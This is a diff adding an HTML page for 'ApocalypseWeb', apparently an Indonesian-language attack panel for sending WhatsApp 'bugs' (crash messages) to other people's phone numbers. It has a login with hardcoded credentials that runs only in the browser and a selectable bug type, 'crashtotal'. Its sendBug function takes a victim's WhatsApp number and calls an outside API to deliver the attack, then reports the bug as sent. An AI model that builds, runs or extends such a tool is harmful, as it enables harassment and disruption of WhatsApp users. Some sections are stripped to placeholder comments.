@@ -1,0 +1,138 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
+  <title>ApocalypseWeb</title>  
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">  
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">  
+  <style>  
+    /* CSS tetap sama */
+  </style>
+</head>  
+<body>  
+<div id="particles-js"></div>  
+<div id="popup" style="display:none;">  
+  <div class="popup-content">  
+    <span class="close-btn" onclick="closePopup()">&times;</span>  
+    <p id="popup-message"></p>  
+  </div>  
+</div>  
+
+<div id="login-box" class="glass-box">  
+  <h1>Login</h1>  
+  <input type="text" id="username" placeholder="Username" />  
+  <input type="password" id="password" placeholder="Password" />  
+  <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>  
+  <div id="login-result" style="margin-top:10px; text-align:center;"></div>  
+</div>  
+
+<div class="glass-box" id="main-box" style="display:none;">  
+  <!-- Konten dashboard tetap sama -->
+  <!-- Di bagian footer atau kontak developer, pastikan ada: -->
+  <div class="footer">
+    <p>Contact Developer: <a href="https://t.me/Azxxoffcl0" target="_blank">t.me/Azxxoffcl0</a></p>
+  </div>
+</div>  
+
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>  
+<script>  
+particlesJS("particles-js", {  
+  /* Konfigurasi particles tetap sama */
+});  
+  
+async function getUsers() {  
+  // Mengubah user menjadi Azxz/1920
+  return [{ username: "Azxz", password: "1920" }];
+}  
+  
+function logout() {  
+  sessionStorage.removeItem("currentUser");  
+  location.reload();  
+}  
+  
+function saveSession(user) {  
+  sessionStorage.setItem("currentUser", JSON.stringify(user));  
+}  
+  
+function getSession() {  
+  return JSON.parse(sessionStorage.getItem("currentUser"));  
+}  
+  
+window.onload = async () => {  
+  const user = getSession();  
+  if (user) showDashboard(user);  
+};  
+  
+function showPopup(message) {  
+  document.getElementById("popup-message").innerHTML = message;  
+  document.getElementById("popup").style.display = "flex";  
+}  
+  
+function closePopup() {  
+  document.getElementById("popup").style.display = "none";  
+}  
+  
+async function login() {  
+  const user = document.getElementById("username").value.trim();  
+  const pass = document.getElementById("password").value.trim();  
+  const result = document.getElementById("login-result");  
+  const users = await getUsers();  
+  const found = users.find(u => u.username === user && u.password === pass);  
+  
+  if (found) {  
+    saveSession(found);  
+    showDashboard(found);  
+  } else {  
+    result.innerText = "❌ Username atau Password salah!";  
+    result.style.color = "crimson";  
+  }  
+}  
+  
+function showDashboard(user) {  
+  document.getElementById("login-box").style.display = "none";  
+  document.getElementById("main-box").style.display = "block";  
+  document.getElementById("userLabel").innerText = user.username;  
+}  
+  
+let selectedBug = "crashtotal";  
+document.querySelectorAll(".bug-card").forEach(card => {  
+  card.addEventListener("click", () => {  
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));  
+    card.classList.add("active");  
+    selectedBug = card.getAttribute("data-bug");  
+  });  
+});  
+  
+async function sendBug() {  
+  const input = document.getElementById("target").value.trim();  
+  const resDiv = document.getElementById("result");  
+  const btn = document.getElementById("sendBtn");  
+  
+  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {  
+    resDiv.innerText = "Masukkan nomor WA yang valid!";  
+    resDiv.style.color = "crimson";  
+    return;  
+  }  
+  
+  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;  
+  btn.disabled = true;  
+  const originalHTML = btn.innerHTML;  
+  btn.innerHTML = '<span class="spinner"></span> Mengirim...';  
+  resDiv.innerText = "";  
+  
+  try {  
+    const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);  
+    const json = await res.json();  
+    showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);  
+  } catch (err) {  
+    resDiv.innerText = "❌ Gagal fetch: " + err;  
+    resDiv.style.color = "crimson";  
+  }  
+  
+  btn.disabled = false;  
+  btn.innerHTML = originalHTML;  
+}  
+</script>  
+</body>  
+</html>
